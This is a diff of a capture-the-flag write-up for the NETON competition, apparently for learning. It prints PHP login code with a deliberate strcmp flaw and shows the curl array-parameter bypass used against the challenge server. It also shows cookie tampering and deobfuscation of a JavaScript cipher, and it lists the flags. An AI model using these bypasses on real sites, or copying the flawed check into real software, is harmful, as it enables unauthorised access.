@@ -59,7 +59,7 @@ Although the password is randomised (as could be deduced from the provided ELF),
 Nice! The flag is NETON{N1c3_ByP4sS_My_Fr13eND!}
 ```
 
-I'm not sure whether this counts as a bypass... but hey, it worked. : )
+I'm not sure whether or not this counts as a bypass... but hey, it worked. : )
 
 
 
@@ -67,7 +67,51 @@ I'm not sure whether this counts as a bypass... but hey, it worked. : )
 
 ### Welcome to FilterLand - 208
 
-![](Challenge%20Screenshots/Web%20-%20Picnicnic.png)
+![](Challenge%20Screenshots/Web%20-%20Welcome%20to%20FilterLand.png)
+
+The website asks us for a password, nothing more, nothing less. By using the browser inspect tool (F-12) we see it posts our input to check.php. It also tells us they have made the PHP file available to us, so of course, we take a look :).
+
+```php
+<?php
+    $FLAG =  (file_get_contents("/flag.txt")); //SECRET
+    $PASSWORD = $_POST['password']; //User password
+
+    if(isset($PASSWORD)){
+    
+    $PASSWORD = str_replace("s4cuRe_p4sW0rD","Nice_try!",$PASSWORD); //Replace
+
+    if(strcmp('s4cuRe_p4sW0rD', $PASSWORD) == 0){ //Check
+            
+            echo $FLAG;
+        
+        }
+        else{
+            header("Location: /fail.html");
+            die();
+        }
+
+    }
+    else {
+        echo "Give me what I'm looking for ):";
+    }
+
+?>
+```
+
+So the correct password is 's4cuRe_p4sW0rD', but they filter it out of our responses, how cheeky :c. Fortunately, or rather unfortunately, there is a vulnerability to the PHP strcmp functions. If instead of a string, we pass on something PHP recognises as a list it will return True, regardless of our input :).
+
+I first tried to use HTML by going to the link
+```
+http://167.99.129.209:8000/check.php?password[]=oops
+```
+However, this did not work so I used curl instead
+```sh
+curl -d password[]=oops 167.99.129.209:8000/check.php
+```
+which happily returns our desired flag
+```
+NETON{arrays_FOR_the_WIN!}
+```
 
 
 
@@ -75,7 +119,7 @@ I'm not sure whether this counts as a bypass... but hey, it worked. : )
 
 ![](Challenge%20Screenshots/Web%20-%20Picnicnic.png)
 
-Upon going to the given website we are greeted with four appetising pictures of some cookies. Yum! However, there is a fifth. If we inspect the page (F-12) and check the 'Storage' tab we see another cookie, named 'flag' with the value 'TkVUT057MHV'. This looks a lot like base64 encoding, and indeed we find
+Upon visiting the given website we are greeted with four appetising pictures of some cookies. Yum! However, there is a fifth. If we inspect the page (F-12) and check the 'Storage' tab we see another cookie, named 'flag' with the value 'TkVUT057MHV'. This looks a lot like base64 encoding, and indeed we find
 ```
 NETON{0u
 ```
@@ -87,7 +131,7 @@ What about visiting through curl and sending this cookie with us. (Or setting th
 ```sh
 curl -v --cookie "flag=TkVUT057MHV" http://167.99.129.209:8001
 ```
-*Remember to use the verbose option '-v' in order to see the cookie.*
+*Remember to use the verbose option '-v' in order to see the cookie information.*
 
 Suddenly, our cookie value has changed! In fact, we can do this process four times to find all four pieces of the flag.
 
@@ -113,7 +157,7 @@ NETON{0ur_c00kieS_4re_4wes0me!}
 curl -d captcha_challenge=d1ctXg --cookie "PHPSESSID=eh9nn1eko8aj2oe88d9oj542ec" http://167.99.129.209:8002/flag.php
 ```
 
-Succes! Within the returned html we find
+Succes! Within the returned HTML we find
 
 ```
 Nice evade! Take the flag: <b>NETON{7c49af83a2a68304273a8d330cebd93c}</b>
@@ -125,6 +169,31 @@ Nice evade! Take the flag: <b>NETON{7c49af83a2a68304273a8d330cebd93c}</b>
 
 ![](Challenge%20Screenshots/Web%20-%20Grades.png)
 
+So somebody hacked the final exam grades to inflate their own... up to 1337, alright. Well in that case it seems our friend 'nUK<,IDt-.bvKL|./EO$%;k}@\_' is the culprit. However, his name is encrypted...
+
+Within the html file we find some obfuscated javascript
+```js
+function encrypt(_0x40a681) {
+    var _0x16b830 = 0x20, _0x561689 = 0x5e, _0x3db275 = 0x0, _0x38a41d = '';
+    for (var _0x278871 = 0x0; _0x278871 < _0x40a681['length']; _0x278871++) {
+         _0x38a41d = _0x38a41d + String['fromCharCode']((_0x40a681['charCodeAt'](_0x278871) + _0x3db275) % _0x561689 + _0x16b830), _0x3db275 = _0x3db275 + _0x40a681['charCodeAt'](_0x278871);
+    }
+    return _0x38a41d;
+```
+We can de-obfuscate this simple function by replacing the nonsense variable names with names that make sense, and by inserting values wherever possible. After this, we find a more readable encrypt function
+```js
+function encrypt(input) {
+    var output = '', c0 = 0;
+    for (var i = 0; i < input['length']; i++) {
+        output = output + String['fromCharCode']((input['charCodeAt'](i) + c0) % 94 + 32),
+        c0 = c0 + input['charCodeAt'](i);
+    }
+    return output;
+```
+Because of the modulo in there, it might be a bit rough to reverse directly, so let's just brute-force it instead. We can do so by simply trying out a character and seeing if our trial flag matches with the given encrypted flag. I used the following script
+```
+
+```
 
 
 ## Stego Category
@@ -166,6 +235,13 @@ NETON{wh1t3_spac3_tr1cks}
 
 ### Step by step - UNSOLVED (250)
 
+We are giving the following, seemingly uinteresting picture.
+
+![](Challenge%20Files/neton.bmp)
+
+You can either use the magic selection tool (threshold: 0), the fill bucket (threshold: 0), or simply apply an auto-contrast. The latter options yields the following image
+
+![](Solution%20Screenshots/StegSBS%20-%20Contrasted.png)
 
 
 ### Invisibility - UNSOLVED (500)
